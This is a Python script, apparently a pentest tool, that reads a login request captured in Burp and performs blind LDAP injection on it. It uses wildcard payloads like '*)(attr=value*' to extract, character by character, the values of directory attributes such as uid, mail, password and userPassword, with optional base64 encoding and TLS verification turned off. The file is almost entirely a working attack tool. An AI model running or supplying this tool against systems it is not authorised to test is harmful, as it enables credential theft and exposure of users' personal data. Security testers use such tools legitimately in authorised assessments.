#!/usr/bin/env python3
import requests
import string
from time import sleep
import sys
import base64
import Burpee.burpee
import logging
import traceback
import argparse
import json
import re
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def enum(url, header, data, proxy, args):
  alphabet = string.ascii_letters + string.digits + "_@{}-/()!\"$%=^[]:;"
  attributes = ["c", "cn", "co", "commonName", "dc", "facsimileTelephoneNumber", "givenName", "gn", "homePhone", "id", "jpegPhoto", "l", "mail", "mobile", "name", "o", "objectClass", "ou", "owner", "pager", "password", "sn", "st", "surname", "uid", "username", "userPassword",]

  for attribute in attributes: #Extract all attributes
    value = ""
    finish = False
    while not finish:
      for char in alphabet: #In each possition test each possible printable char
        query = "*)({}={}{}*".format(attribute, value, char)

        # if base64 encoded:
        if args.encode:
          query = base64.b64encode(query.encode("utf-8")).decode("utf-8")
        logging.debug("payload: {}".format(query))

        url_ = url.replace(args.insertionTag, query)

        #data = {'login':query, 'password':'bla'}
        data_str = json.dumps(data).replace(args.insertionTag, query)
        data_ = json.loads(data_str)

        header_str = json.dumps(header).replace(args.insertionTag, query)
        header_ = json.loads(header_str)

        r = requests.post(url_, headers=header_, data=data_, proxies=proxy, verify=False)
        sys.stdout.write(f"\r{attribute}: {value}{char}")

        #sleep(0.5) #Avoid brute-force bans

        if "Cannot login" in r.text and not ("not valid" in r.text or "Malformed" in r.text):
          value += str(char)
          break

        if char == alphabet[-1]: #If last of all the chars, then, no more chars in the value
          finish = True
          print()

def extractKeyword(string):
  keyword = ""
  try:
    tags = ["[l,L]ogin", "[u,U]sername", "[u,U]ser"]
    keyword = ""
    for t in tags:
      keyword = re.search("([^\"]*.?" + t + "[^\"]*)", string).group(1)
      print("Searching string {}".format(string))
      print("Keyword {}".format(keyword))
      if keyword != "":
        user = input("[+] Keyword {} found. Continue with this insertion point? [Y/n]: ".format(keyword))
        if user == 'Y' or user == '':
          break
        else:
          keyword = ""

    logging.debug("Keyword {}".format(keyword))
  
  except:
    keyword = ""

  return keyword



def calculateInsertionPoint(url, header, data, args):
  print("[*] Calculating insertion point.")
  print(data)
  data_str = json.dumps(data)
  header_str = json.dumps(header)
  if args.insertionTag not in url and args.insertionTag not in data_str and args.insertionTag not in header_str:
    print("[*] Insertion tag '*' not found in request. Searching for keywords 'login', 'username' and 'user'.")
   
    print("[*] Searching header for insertion points.") 
    key = extractKeyword(header_str)
    if key != "":
      print("[*] Inserting insertion point into header {}".format(key))
      header[key] = '*'
    else:
      print("[*] Searching post data for insertion points.")
      key = extractKeyword(data_str) 
      if key != "":
        print("[*] Inserting insertion point into data parameter {}".format(key))
        data[key] = '*'
      else:
        print("[*] Searching url for insertion points.")
        key = extractKeyword(url) 
        if key != "":
          print("[*] Inserting insertion point into url parameter {}".format(key))
          #url[key] = '*'
        else:
          print("[*] No insertion points inserted.")
          print("[*] Aborting.")
          exit(0)

  return (url, header, data)



def main():
  # TODO: Splash screen

  parser = argparse.ArgumentParser(description="Test a login page for LDAP injection.")
  parser.add_argument('-r', '--req', dest='requestFile', type=str, required=True, help="Request file. For example copied from Burp.")  
  parser.add_argument('-t', '--tag', dest="insertionTag", type=str, default='*', help="Insertion point. Default *. Marks the spot for LDAP insertion.")
  parser.add_argument('--protocol', dest='protocol', type=str, default='https', help="The protocol to user: https or http. Default https.")
  parser.add_argument('--proxy', dest='proxy', type=str, default='', help="Use a proxy to connect to the target URL. Example: --proxy 127.0.0.1:8080")
  parser.add_argument('--encode', dest='encode', action='store_true', help="Base64-encode the payload.")
  parser.add_argument('--module', dest='module', type=str, default='enum', help="The module to use: login (TODO), enum, dump (TODO)")
  parser.add_argument('--loglevel', dest='loglevel', default='INFO', help="DEBUG, INFO, WARNING, ERROR")
  args = parser.parse_args()

  logging.basicConfig(level=getattr(logging, args.loglevel))


  header, data = Burpee.burpee.parse_request(args.requestFile)
  method_name , resource_name = Burpee.burpee.get_method_and_resource(args.requestFile)
  url = args.protocol + "://" + header["Host"] + resource_name
  logging.debug("Extracted headers: {}".format(header))
  logging.debug("Extracted post data: {}".format(data))
  logging.debug("Extracted url: {}".format(url))

  url, header, data = calculateInsertionPoint(url, header, data, args)

  if args.proxy != '':
    proxy = { "http" : "http://" + args.proxy, "https" : "http://" + args.proxy }
  else:
    proxy = {}
  logging.debug("Using proxy {}".format(proxy))


  if args.module == 'enum':
    enum(url, header, data, proxy, args)

if __name__ == '__main__':
  try:
    main()
  except (KeyboardInterrupt):
    logging.info('Exiting.')
  except Exception as e:
    logging.error("Exiting {}".format(e))
    logging.debug(traceback.format_exc())

